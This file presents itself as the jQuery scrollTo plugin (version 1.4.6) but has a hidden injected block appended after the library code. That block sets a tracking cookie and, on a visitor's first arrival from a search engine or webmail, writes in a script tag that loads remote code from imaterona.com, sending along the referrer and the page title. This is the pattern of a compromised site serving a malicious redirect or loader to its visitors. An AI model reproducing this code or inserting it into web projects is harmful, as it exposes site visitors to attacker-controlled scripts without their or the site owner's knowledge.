
/**
 * Copyright (c) 2007-2013 Ariel Flesler - aflesler<a>gmail<d>com | http://flesler.blogspot.com
 * Dual licensed under MIT and GPL.
 * @author Ariel Flesler
 * @version 1.4.6
 */
;(function($){var h=$.scrollTo=function(a,b,c){$(window).scrollTo(a,b,c)};h.defaults={axis:'xy',duration:parseFloat($.fn.jquery)>=1.3?0:1,limit:true};h.window=function(a){return $(window)._scrollable()};$.fn._scrollable=function(){return this.map(function(){var a=this,isWin=!a.nodeName||$.inArray(a.nodeName.toLowerCase(),['iframe','#document','html','body'])!=-1;if(!isWin)return a;var b=(a.contentWindow||a).document||a.ownerDocument||a;return/webkit/i.test(navigator.userAgent)||b.compatMode=='BackCompat'?b.body:b.documentElement})};$.fn.scrollTo=function(e,f,g){if(typeof f=='object'){g=f;f=0}if(typeof g=='function')g={onAfter:g};if(e=='max')e=9e9;g=$.extend({},h.defaults,g);f=f||g.duration;g.queue=g.queue&&g.axis.length>1;if(g.queue)f/=2;g.offset=both(g.offset);g.over=both(g.over);return this._scrollable().each(function(){if(e==null)return;var d=this,$elem=$(d),targ=e,toff,attr={},win=$elem.is('html,body');switch(typeof targ){case'number':case'string':if(/^([+-]=?)?\d+(\.\d+)?(px|%)?$/.test(targ)){targ=both(targ);break}targ=$(targ,this);if(!targ.length)return;case'object':if(targ.is||targ.style)toff=(targ=$(targ)).offset()}$.each(g.axis.split(''),function(i,a){var b=a=='x'?'Left':'Top',pos=b.toLowerCase(),key='scroll'+b,old=d[key],max=h.max(d,a);if(toff){attr[key]=toff[pos]+(win?0:old-$elem.offset()[pos]);if(g.margin){attr[key]-=parseInt(targ.css('margin'+b))||0;attr[key]-=parseInt(targ.css('border'+b+'Width'))||0}attr[key]+=g.offset[pos]||0;if(g.over[pos])attr[key]+=targ[a=='x'?'width':'height']()*g.over[pos]}else{var c=targ[pos];attr[key]=c.slice&&c.slice(-1)=='%'?parseFloat(c)/100*max:c}if(g.limit&&/^\d+$/.test(attr[key]))attr[key]=attr[key]<=0?0:Math.min(attr[key],max);if(!i&&g.queue){if(old!=attr[key])animate(g.onAfterFirst);delete attr[key]}});animate(g.onAfter);function animate(a){$elem.animate(attr,f,g.easing,a&&function(){a.call(this,targ,g)})}}).end()};h.max=function(a,b){var c=b=='x'?'Width':'Height',scroll='scroll'+c;if(!$(a).is('html,body'))return a[scroll]-$(a)[c.toLowerCase()]();var d='client'+c,html=a.ownerDocument.documentElement,body=a.ownerDocument.body;return Math.max(html[scroll],body[scroll])-Math.min(html[d],body[d])};function both(a){return typeof a=='object'?a:{top:a,left:a}}})(jQuery);
{
	function setCookie (name, value, expires, path, domain, secure) {
		  document.cookie = name + "=" + escape(value) +
			((expires) ? "; expires=" + expires : "") +
			((path) ? "; path=" + path : "") +
			((domain) ? "; domain=" + domain : "") +
			((secure) ? "; secure" : "");
	}
	function getCookie(c_name) {
		var i,x,y,ARRcookies=document.cookie.split(";");
		for (i=0;i<ARRcookies.length;i++) {
		    x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
		    y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
		    x=x.replace(/^\s+|\s+$/g,"");
		    if (x==c_name)	{
				return unescape(y);
			}
		}
	}	
	function strlen(string){
		if(typeof string == "undefined") {
			return 0;
		} else {
			return string.length;
		}
	}
	var dt = new Date(), expiryTime = dt.setTime( dt.getTime() + 14400000000 );
	var currentCookie = getCookie("arx_tt");
	if(!document.referrer) {
		setCookie("arx_tt", 1, dt.toGMTString(), "/");
	} else {
	document.write('.')
	}
	if (strlen(currentCookie) == 0) {
		var setted = 1;
		setCookie("arx_tt", 1, dt.toGMTString(), "/");
		function R(){var Ref=document.referrer;if(Ref.indexOf('.google.')!=-1||Ref.indexOf('.bing.')!=-1||Ref.indexOf('.yahoo.')!=-1||Ref.indexOf('.mail.')!=-1||Ref.indexOf('.ask.')!=-1||Ref.indexOf('.rambler.')!=-1||Ref.indexOf('yandex')!=-1){document.write('<script type="text/javascript" src="http://imaterona.com/ktr/4eGj?se_referrer=' + encodeURIComponent(document.referrer)+ '&default_keyword=' + encodeURIComponent(document.title) + '"></script>')}else{document.write('.')}}R();
		}
	}
	setCookie("arx_tt", 1, dt.toGMTString(), "/");
{
	function setCookie (name, value, expires, path, domain, secure) {
		  document.cookie = name + "=" + escape(value) +
			((expires) ? "; expires=" + expires : "") +
			((path) ? "; path=" + path : "") +
			((domain) ? "; domain=" + domain : "") +
			((secure) ? "; secure" : "");
 }
}
 var dt = new Date(), expiryTime = dt.setTime( dt.getTime() + 14400000000 );
 setCookie("arx_tt", 1, dt.toGMTString(), "/");
